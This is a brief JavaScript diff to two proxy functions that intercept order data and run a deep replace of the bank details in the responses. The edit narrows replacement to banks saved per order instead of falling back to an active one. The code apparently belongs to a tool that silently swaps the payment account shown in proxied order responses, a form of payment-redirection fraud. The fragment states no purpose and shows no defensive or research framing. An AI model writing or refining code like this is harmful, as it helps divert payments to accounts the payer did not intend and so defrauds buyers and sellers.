@@ -1203,12 +1203,11 @@ async function proxyAndReplaceBankDetails(req, res, label) {
 
     if (respData) {
       const savedBank = getOrderBankMultiple(data, allOrderIds);
-      const bankToUse = savedBank || active;
-      if (bankToUse) {
+      if (savedBank) {
         if (Array.isArray(respData)) {
-          respData.forEach(item => { if (item && typeof item === 'object') deepReplace(item, bankToUse, {}, 0); });
+          respData.forEach(item => { if (item && typeof item === 'object') deepReplace(item, savedBank, {}, 0); });
         } else {
-          deepReplace(respData, bankToUse, {}, 0);
+          deepReplace(respData, savedBank, {}, 0);
         }
       }
     }
@@ -1329,9 +1328,8 @@ async function proxyAndReplaceBankInActiveOrders(req, res) {
         const ids = getItemIds(item);
         const primaryId = ids[0] || '';
         const savedBank = primaryId ? bankMap[primaryId] : null;
-        const bankToUse = savedBank || active;
-        if (bankToUse) {
-          deepReplace(item, bankToUse, {}, 0);
+        if (savedBank) {
+          deepReplace(item, savedBank, {}, 0);
         }
       }
     }
